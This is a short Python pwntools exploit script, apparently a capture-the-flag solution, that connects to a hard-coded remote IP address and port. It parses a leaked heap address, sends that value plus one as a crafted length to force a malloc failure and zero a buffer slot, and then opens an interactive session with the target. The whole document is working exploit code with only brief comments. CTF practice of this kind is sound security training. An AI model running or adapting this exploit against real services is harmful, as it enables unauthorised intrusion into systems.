from pwn import *
import re

def main():
    # Remote target
    host = '94.237.53.203'
    port = 31377

    # Establish connection
    io = remote(host, port)

    # Receive until we spot the leaked pointer (hex format)
    leak = None
    while True:
        try:
            line = io.recvline(timeout=5)
        except EOFError:
            log.error("Connection closed before leak.")
            return
        if not line:
            continue
        # Look for 0xXXXXXXXX pattern
        m = re.search(b'0x[0-9a-fA-F]+', line)
        if m:
            leak = int(m.group(0), 16)
            log.success(f"Leaked heap address: {hex(leak)}")
            break
        # Print other lines for context
        log.info(line.decode(errors='ignore').strip())

    # Compute length = leaked_address + 1 to force malloc failure and later zero the initial slot
    length = leak + 1
    log.info(f"Sending length: {length}")

    # Send the crafted length
    io.sendline(str(length).encode())

    # After scanf, the program will attempt to read 'length' bytes into a NULL buffer,
    # which on EOF will return 0, allowing the code to proceed.
    # We send a single newline (EOF after) to trigger read returning fewer bytes.
    io.sendline(b"")

    # Drop to interactive mode for further exploration
    io.interactive()

if __name__ == '__main__':
    main()
